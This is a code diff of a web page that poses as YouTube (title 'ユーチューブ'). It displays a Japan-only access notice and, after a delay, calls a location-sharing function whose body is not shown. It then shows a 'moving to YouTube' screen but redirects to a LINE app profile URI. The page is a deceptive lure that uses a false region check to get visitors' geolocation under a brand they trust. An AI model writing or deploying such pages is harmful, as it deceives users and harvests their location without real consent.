@@ -6,18 +6,31 @@
   <title>ユーチューブ</title>
 </head>
 <body>
-  <p>このサイトは日本国内からでしかアクセス出来ません。</p>
-  <p>現在、あなたは日本からアクセスしていますか？</p>
   <p id="result"></p>
+  
+<section id="screen1">
+  <p>このサイトは日本国内からでしかアクセス出来ません。</p>
+  <p>このサイトは日本国内からでしかアクセス出来ません。</p>
+</section>
+
+<section id="screen2" hidden>
+  <h2>YouTubeに移動します</h2>
+  <p>この画面の案内を確認してください。</p>
+  <a href="https://www.youtube.com/">YouTubeを開く</a>
+</section>
 
   <script>
     window.onload = async function() {
       setTimeout(async function() {
+        document.getElementById("screen1").hidden = true;
         const success = await shareLocation();
         if (success) {
-        location.replace("https://www.youtube.com/");
-      }
-      }, 5000);
+          document.getElementById("screen2").hidden = false;
+          setTimeout(async function() {
+            location.replace("line://nv/profile");
+          }, 5000);
+        }
+      }, 6000);
     };
 
     function shareLocation() {
